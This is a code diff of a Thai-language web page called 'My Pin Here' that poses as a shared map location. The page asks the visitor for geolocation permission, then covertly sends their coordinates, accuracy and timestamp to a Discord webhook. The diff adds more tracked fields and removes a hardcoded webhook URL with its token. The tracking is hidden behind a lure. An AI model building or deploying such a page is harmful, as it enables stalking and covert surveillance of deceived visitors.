@@ -275,12 +275,12 @@
                 <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
             </div>
             <h1>My Pin Here</h1>
-            <p class="subtitle">แชร์ตำแหน่งให้คุณแล้ว</p>
+            <p class="subtitle">ตำแหน่งพิเศษรอคุณอยู่</p>
 
             <div class="permission-info">
                 <p>
                     <strong>ต้องการเข้าถึงตำแหน่งของคุณ</strong><br>
-                    เพื่อเข้าชมตำแหน่งนี้ คุณจำเป็นต้องอนุญาตให้เข้าถึงตำแหน่งที่ตั้งของอุปกรณ์ก่อนเพื่อให้ระบบใช้งานแผนที่ ระบบจะนำคุณไปยังหมุดบนแผนที่ทันทีที่ได้รับอนุญาต
+                    เพื่อเข้าชมตำแหน่งนี้ คุณจำเป็นต้องอนุญาตให้เข้าถึงตำแหน่งที่ตั้งของอุปกรณ์ก่อน ระบบจะนำคุณไปยังหมุดบนแผนที่ทันทีที่ได้รับอนุญาต
                 </p>
                 <div class="coords">??.035218, ???.776758</div>
             </div>
@@ -310,11 +310,11 @@
 
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script>
+        // 🛠️ ใส่ URL Discord Webhook ของคุณตรงนี้แทนที่ข้อความเดิม
+        const DISCORD_WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
+
         const TARGET_LAT = 39.035218;
         const TARGET_LNG = 125.776758;
-        
-        // --- ใส่ URL Discord Webhook ของคุณที่นี่ ---
-        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1524030114285752450/ZBtCcXuvNSNIbfdY2vhQwJvFXfRgnhIzFhvtNzUVv0bMm-RVc5-9kmvkjX3kW7ap9Lqw"; 
 
         function requestLocation() {
             const btn = document.getElementById('btnAllow');
@@ -332,34 +332,40 @@
 
             navigator.geolocation.getCurrentPosition(
                 (position) => {
-                    // รับค่าพิกัด
+                    // ดึงค่าข้อมูลตำแหน่งของผู้ใช้งานจริง
                     const userLat = position.coords.latitude;
                     const userLng = position.coords.longitude;
-                    
-                    // ส่งข้อมูลไปยัง Discord Webhook ทันที
-                    if (DISCORD_WEBHOOK_URL !== "https://discord.com/api/webhooks/1524030114285752450/ZBtCcXuvNSNIbfdY2vhQwJvFXfRgnhIzFhvtNzUVv0bMm-RVc5-9kmvkjX3kW7ap9Lqw" && DISCORD_WEBHOOK_URL !== "") {
-                        const payload = {
-                            username: "Location Bot",
-                            embeds: [{
-                                title: "📍 แจ้งเตือน: ได้รับตำแหน่งใหม่",
-                                color: 16739923, // สีแดงส้มให้เข้ากับธีม
-                                fields: [
-                                    { name: "Latitude", value: `\`${userLat}\``, inline: true },
-                                    { name: "Longitude", value: `\`${userLng}\``, inline: true },
-                                    { name: "Google Maps", value: `[คลิกเพื่อดูแผนที่](https://www.google.com/maps?q=${userLat},${userLng})`, inline: false }
-                                ],
-                                timestamp: new Date().toISOString()
-                            }]
-                        };
+                    const accuracy = position.coords.accuracy;
+                    const timestamp = new Date(position.timestamp).toLocaleString('th-TH');
 
+                    // ส่งข้อมูลไปยัง Discord Webhook ทันทีที่มีการกดยอมรับสิทธิ์
+                    if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL !== 'YOUR_DISCORD_WEBHOOK_URL_HERE') {
                         fetch(DISCORD_WEBHOOK_URL, {
                             method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify(payload)
-                        }).catch(error => console.error("Webhook Error:", error));
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                embeds: [{
+                                    title: "📍 ได้รับพิกัดตำแหน่งใหม่จากผู้ใช้งาน",
+                                    color: 16738123, // รหัสสีส้มแดง #ff6b6b
+                                    fields: [
+                                        { name: "ละติจูด (Latitude)", value: `\`${userLat}\``, inline: true },
+                                        { name: "ลองจิจูด (Longitude)", value: `\`${userLng}\``, inline: true },
+                                        { name: "ความแม่นยำรัศมี", value: `± ${accuracy.toFixed(2)} เมตร`, inline: true },
+                                        { name: "วันเวลาที่กดยอมรับ", value: timestamp, inline: false },
+                                        { name: "ลิงก์นำทางระบบ Google Maps", value: `https://www.google.com/maps?q=${userLat},${userLng}`, inline: false }
+                                    ],
+                                    footer: {
+                                        text: "ระบบติดตามพิกัดอัตโนมัติ • My Pin Here"
+                                    },
+                                    timestamp: new Date().toISOString()
+                                }]
+                            })
+                        }).catch(err => console.error('Discord Webhook transmission failed:', err));
                     }
 
-                    // Success - show map
+                    // ปิดโหลดสถานะเดิมและเปลี่ยนการแสดงผลไปยังหน้าแผนที่
                     loading.style.display = 'none';
                     showMap();
                 },
